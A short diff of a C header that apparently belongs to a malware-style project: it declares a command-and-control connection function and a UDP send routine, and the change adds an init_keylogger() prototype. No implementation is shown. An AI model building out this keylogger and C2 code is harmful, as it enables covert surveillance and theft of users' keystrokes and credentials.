@@ -22,6 +22,8 @@ struct sockaddr_in;
 int connect_cc(char *ip_adrr, int port, int *socket_desc,
 	       struct sockaddr_in *server, int isTCP);
 
+int init_keylogger();
+
 /** 
  * Sends some data through UDP
  * 
